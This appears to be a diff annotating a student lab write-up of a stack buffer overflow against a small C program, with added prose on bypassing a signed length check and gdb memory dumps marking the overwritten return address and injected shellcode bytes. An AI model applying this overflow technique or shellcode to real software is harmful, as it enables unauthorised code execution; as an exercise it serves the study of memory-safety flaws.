@@ -1,3 +1,5 @@
+This is similar to the last problem except the code has a check to only read in 127 bytes. The vulnerability is that a signed int is used. So we can use negative number (like 0xFF) to get past the check. Then we can just do something similar to part 1 where we find how many bytes to put in the buffer so we can overwrite the eip. This is 148 (0xbffffbfc - 0xbffffb68) bytes.
+
 (gdb) print &msg
 $1 = (char (*)[128]) 0xbffffb68
 
@@ -21,7 +23,7 @@ display (path=0xbffffdb3 "pwnzerized.txt") at agent-smith.c:9
 0xbffffbc0:     0x00000000      0x00000000      0x00000000      0x00000000
 0xbffffbd0:     0x00000000      0x00000000      0x00000000      0x00000000
 0xbffffbe0:     0x00000000      0x00000000      0x0804a000      0x080485e2
-0xbffffbf0:     0x00000002      0xbffffcb4      0xbffffc18      0x0804857b
+0xbffffbf0:     0x00000002      0xbffffcb4      0xbffffc18      0x0804857b	<-eip
 0xbffffc00:     0xbffffdb3      0x00000000      0x08048599      0xb7fd2000
 0xbffffc10:     0x08048590      0x00000000      0x00000000      0xb7e454d3
 0xbffffc20:     0x00000002      0xbffffcb4      0xbffffcc0      0xb7fdc858
@@ -60,7 +62,7 @@ FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF▒
 18      }
 (gdb) x/100x $esp
 0xbffffb50:     0xbffffb68      0x00000001      0xffffffff      0x0804b008
-0xbffffb60:     0x00000001      0xff000000      0x46464646      0x46464646
+0xbffffb60:     0x00000001      0xff000000      0x46464646      0x46464646	<-- junk characters
 0xbffffb70:     0x46464646      0x46464646      0x46464646      0x46464646
 0xbffffb80:     0x46464646      0x46464646      0x46464646      0x46464646
 0xbffffb90:     0x46464646      0x46464646      0x46464646      0x46464646
@@ -69,7 +71,7 @@ FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF▒
 0xbffffbc0:     0x46464646      0x46464646      0x46464646      0x46464646
 0xbffffbd0:     0x46464646      0x46464646      0x46464646      0x46464646
 0xbffffbe0:     0x46464646      0x46464646      0x000000c6      0x46464646
-0xbffffbf0:     0x46464646      0x46464646      0x46464646      0xbffffc00
+0xbffffbf0:     0x46464646      0x46464646      0x46464646      0xbffffc00	<-- address of shellcode
 0xbffffc00:     0x895e1feb      0xc0310876      0x89074688      0x0bb00c46
 0xbffffc10:     0x4e8df389      0x0c568d08      0xdb3180cd      0xcd40d889
 0xbffffc20:     0xffdce880      0x622fffff      0x732f6e69      0xb7fd0a68
